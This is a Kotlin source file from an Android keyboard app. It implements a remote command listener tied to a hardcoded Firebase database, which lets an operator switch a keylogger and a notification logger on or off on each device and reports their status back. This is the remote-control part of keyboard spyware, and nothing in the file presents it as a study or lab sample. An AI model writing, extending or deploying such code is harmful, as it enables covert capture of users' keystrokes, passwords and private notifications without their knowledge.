package com.example.mykeyboard

import android.os.Build
import android.util.Log
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

object RemoteCommandListener {
    private const val TAG = "RemoteCommandListener"
    private var isListening = false
    private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    fun startListening() {
        if (isListening) {
            reportCurrentStatus()
            return
        }
        isListening = true

        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)

            reportCurrentStatus()

            ref.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        val keyObj = snapshot.child("keylogging").value
                        val keylogging = when (keyObj) {
                            is Boolean -> keyObj
                            is String -> keyObj.toBoolean()
                            else -> null
                        }
                        if (keylogging != null && keylogging != KeyloggingConfig.isEnabled) {
                            KeyloggingConfig.isEnabled = keylogging
                            LogStore.addLog("Remote Command: Key Logger set to $keylogging")
                            reportCurrentStatus()
                        }

                        val notifObj = snapshot.child("notifications").value
                        val notifications = when (notifObj) {
                            is Boolean -> notifObj
                            is String -> notifObj.toBoolean()
                            else -> null
                        }
                        if (notifications != null && notifications != NotificationConfig.isEnabled) {
                            NotificationConfig.isEnabled = notifications
                            LogStore.addLog("Remote Command: Notification Logger set to $notifications")
                            reportCurrentStatus()
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing remote command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Remote command listener cancelled", error.toException())
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Exception starting remote command listener", e)
        }
    }

    fun reportCurrentStatus() {
        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
            ref.child("keylogging").setValue(KeyloggingConfig.isEnabled)
            ref.child("notifications").setValue(NotificationConfig.isEnabled)
        } catch (e: Exception) {
            Log.e(TAG, "Error reporting status", e)
        }
    }
}
